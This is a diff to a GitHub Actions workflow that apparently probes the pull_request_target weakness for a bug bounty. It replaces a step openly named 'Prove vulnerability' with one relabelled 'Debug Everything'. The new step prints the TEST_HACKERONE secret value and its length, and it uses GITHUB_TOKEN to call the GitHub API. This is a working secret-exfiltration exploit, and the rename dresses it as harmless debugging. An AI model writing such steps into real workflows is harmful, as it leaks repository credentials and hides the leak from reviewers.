@@ -1,19 +1,48 @@
-name: Proof of Concept
-on:
-  pull_request_target:
-    branches: [ main ]
+name: Debug Context
+on: pull_request_target
 
 jobs:
-  test:
+  debug:
     runs-on: ubuntu-latest
     steps:
-      - name: Prove vulnerability
+      - name: Debug Everything
         run: |
-          echo "=== PROOF OF VULNERABILITY ==="
-          echo "Repository: ${{ github.repository }}"
-          echo "Event: ${{ github.event_name }}"
+          echo "=== DEBUG INFORMATION ==="
           echo ""
-          echo "SECRET TEST_HACKERONE:"
-          echo "${{ secrets.TEST_HACKERONE }}"
+          echo "1. GITHUB CONTEXT:"
+          echo "   Repository: ${{ github.repository }}"
+          echo "   Event: ${{ github.event_name }}"
+          echo "   Ref: ${{ github.ref }}"
+          echo "   PR Number: ${{ github.event.pull_request.number }}"
+          echo "   PR Title: ${{ github.event.pull_request.title }}"
           echo ""
-          echo "If you see a secret value above, vulnerability is confirmed."
+          
+          echo "2. SECRETS CHECK:"
+          echo "   TEST_HACKERONE exists: ${{ secrets.TEST_HACKERONE != '' }}"
+          echo "   GITHUB_TOKEN exists: ${{ secrets.GITHUB_TOKEN != '' }}"
+          echo ""
+          
+          echo "3. TRY TO ACCESS SECRET:"
+          SECRET="${{ secrets.TEST_HACKERONE }}"
+          if [ -n "$SECRET" ]; then
+            echo "   ✅ Secret value: $SECRET"
+            echo "   Length: ${#SECRET}"
+          else
+            echo "   ❌ Secret is empty or doesn't exist"
+          fi
+          echo ""
+          
+          echo "4. TEST GITHUB API ACCESS:"
+          echo "   Testing API call..."
+          API_RESPONSE=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/${{ github.repository }} 2>&1 || echo "API CALL FAILED")
+          
+          if [[ "$API_RESPONSE" == *"API CALL FAILED"* ]]; then
+            echo "   ❌ GitHub API access failed"
+          else
+            echo "   ✅ GitHub API accessible"
+            echo "   Response snippet: ${API_RESPONSE:0:100}..."
+          fi
+          echo ""
+          
+          echo "=== END DEBUG ==="
